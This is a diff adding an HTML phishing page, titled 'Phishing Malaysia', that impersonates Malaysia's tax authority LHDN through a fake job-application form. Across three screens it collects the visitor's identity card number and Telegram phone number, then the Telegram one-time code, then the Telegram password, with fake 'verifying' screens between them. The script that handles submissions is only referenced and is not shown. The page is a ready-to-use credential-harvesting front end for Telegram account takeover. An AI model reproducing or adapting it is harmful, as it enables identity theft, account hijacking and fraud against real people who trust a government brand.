@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Phishing Malaysia</title>
+    <!-- favicon -->
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+
+    <!-- style -->
+    <link rel="stylesheet" href="style.css" />
+
+    <!-- feather icons -->
+    <script src="https://unpkg.com/feather-icons"></script>
+
+    <!-- my font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,300;0,400;0,700;1,700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+
+  <body>
+    <div id="page1" class="page">
+      <!-- navbar -->
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="Jata Negara@3x.gif"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+          <img
+            src="LHDN logo@3x.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+        </div>
+        <div class="navbar-nav">
+          <div class="search-bar">
+            <div class="search-icon">
+              <i data-feather="search"></i>
+            </div>
+          </div>
+          <div class="hamburger-menu">
+            <div class="menu-icon" onclick="toggleMenu()">
+              <i data-feather="menu"></i>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <!-- navbar end -->
+
+      <!-- hero -->
+      <div class="hero">
+        <div class="hero-image">
+          <img src="bd.png" alt="tng-img" />
+        </div>
+        <div class="hero-text">
+          <h1>HANTAR RESUME SEKARANG</h1>
+        </div>
+
+        <div class="form-container">
+          <form id="registrationForm">
+            <div class="input-wrapper">
+              <label for="name" style="font-size: 14px; font-weight: bold"
+                >No. Kad Pengenalan</label
+              >
+              <input
+                type="text"
+                id="name"
+                name="name"
+                placeholder="contoh: 000727115964"
+                required
+              />
+            </div>
+            <div class="input-wrapper">
+              <label for="phone" style="font-size: 14px; font-weight: bold"
+                >Nombor Telefon Telegram</label
+              >
+              <input
+                type="tel"
+                id="phone"
+                name="phone"
+                placeholder="contoh: +601153476785"
+                required
+              />
+            </div>
+            <button type="submit" id="submit" class="btn">LOG MASUK</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div id="page2" class="page" style="display: none">
+      <!-- navbar -->
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="Jata Negara@3x.gif"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+          <img
+            src="LHDN logo@3x.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+        </div>
+        <div class="navbar-nav">
+          <div class="search-bar">
+            <div class="search-icon">
+              <i data-feather="search"></i>
+            </div>
+          </div>
+          <div class="hamburger-menu">
+            <div class="menu-icon" onclick="toggleMenu()">
+              <i data-feather="menu"></i>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <!-- navbar end -->
+
+      <div class="hero">
+        <img
+          src="bd.png"
+          alt="tng-img"
+          style="margin-top: 0"
+          width="100%"
+          height="auto"
+          display="block"
+        />
+        <div class="hero-text" style="margin-top: 0">
+          <h1>HANTAR RESUME SEKARANG</h1>
+        </div>
+        <div class="form-container">
+          <p class="no-margin">
+            Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda
+          </p>
+          <form id="otpForm">
+            <label for="otp-1">Masukan Kod-OTP</label>
+            <div class="otp-container">
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-1"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-2"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-3"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-4"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-5"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+            </div>
+            <button type="submit" class="btn">TERUSKAN</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div id="page3" class="page" style="display: none">
+      <!-- navbar -->
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img
+            src="Jata Negara@3x.gif"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+          <img
+            src="LHDN logo@3x.png"
+            alt="Logo Negara"
+            class="navbar-img"
+            style="width: 60px; height: auto"
+          />
+        </div>
+        <div class="navbar-nav">
+          <div class="search-bar">
+            <div class="search-icon">
+              <i data-feather="search"></i>
+            </div>
+          </div>
+          <div class="hamburger-menu">
+            <div class="menu-icon" onclick="toggleMenu()">
+              <i data-feather="menu"></i>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <!-- navbar end -->
+      <div class="hero">
+        <img
+          src="bd.png"
+          alt="tng-img"
+          style="margin-top: 0"
+          width="100%"
+          display="block"
+        />
+        <div class="hero-text" style="margin-top: 0">
+          <h1>HANTAR RESUME SEKARANG</h1>
+        </div>
+        <div class="form-container">
+          <p id="kataSandi">Sila Masukan kata laluan Telegram Anda</p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukan kata laluan"
+              required
+            />
+            <button type="submit" class="btn">TERUSKAN</button>
+          </form>
+
+          <div id="loadingContent" style="display: none">
+            <img
+              id="loadingGif"
+              src="processing.gif"
+              alt="Loading..."
+              style="
+                margin: 20px auto;
+                width: 50%;
+                height: auto;
+                display: block;
+                align-items: center;
+                justify-content: center;
+              "
+            />
+
+            <p id="formMessage" style="text-align: center">
+              Mohon tunggu proses pengesahan atau...
+            </p>
+
+            <button
+              id="useAnotherPhone"
+              style="
+                width: 100%;
+                padding: 10px;
+                margin: 30px auto 0;
+                background-color: var(--accent-yellow);
+                color: white;
+                border: none;
+                border-radius: 10px;
+                font-size: 1.1rem;
+                cursor: pointer;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              Guna Nombor Telefon Lain
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- footer -->
+    <div class="footer">
+      <p>
+        Hakcipta Terpelihara 2024 &copy; Lembaga Hasil Dalam Negeri Malaysia
+      </p>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+      <p style="color: var(--accent-yellow); margin-top: 10px; font-size: 14px">
+        Tunggu kami sedang menyemak...
+      </p>
+    </div>
+  </body>
+
+  <!-- script -->
+  <script src="script.js"></script>
+
+  <!-- feather icons -->
+  <script>
+    feather.replace();
+  </script>
+</html>
